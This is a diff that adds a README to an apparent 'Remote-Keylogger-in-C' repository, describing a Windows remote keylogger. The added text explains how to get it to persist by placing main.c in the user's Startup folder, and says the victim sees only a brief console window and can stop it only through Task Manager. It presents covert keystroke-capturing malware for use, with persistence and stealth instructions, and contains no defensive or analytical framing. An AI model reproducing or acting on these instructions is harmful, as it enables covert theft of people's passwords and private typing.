@@ -1,1 +1,2 @@
 # Remote-Keylogger-in-C
+This is a remote keylogger for Windows. main.c is a program which must be put into C:\Users\<user name>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup folder so that even after restarting the computer, the keylogger runs. On startup, the user would see a cmd windows pop up and disappear only. After that, the only way to shut down the keylogger is to locate it under Task Manager and close it.
